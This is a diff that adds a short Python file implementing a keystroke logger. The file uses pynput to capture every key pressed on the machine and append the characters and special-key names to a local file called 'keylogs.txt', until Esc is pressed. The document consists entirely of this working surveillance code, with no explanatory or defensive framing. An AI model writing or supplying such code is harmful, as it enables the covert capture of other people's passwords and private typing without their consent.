@@ -1,0 +1,24 @@
+import os
+from pynput import keyboard
+
+log_file = "keylogs.txt"
+
+def on_press(key):
+    try:
+        if hasattr(key, 'char') and key.char.isalnum():
+            with open(log_file, 'a') as f:
+                f.write(key.char)
+        else:
+            with open(log_file, 'a') as f:
+                f.write(f" <{key.name}> ")
+    except AttributeError:
+        pass
+    except IOError:
+        print("Error writing to file")
+
+def on_release(key):
+    if key == keyboard.Key.esc:
+        return False
+
+with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
+    listener.join()
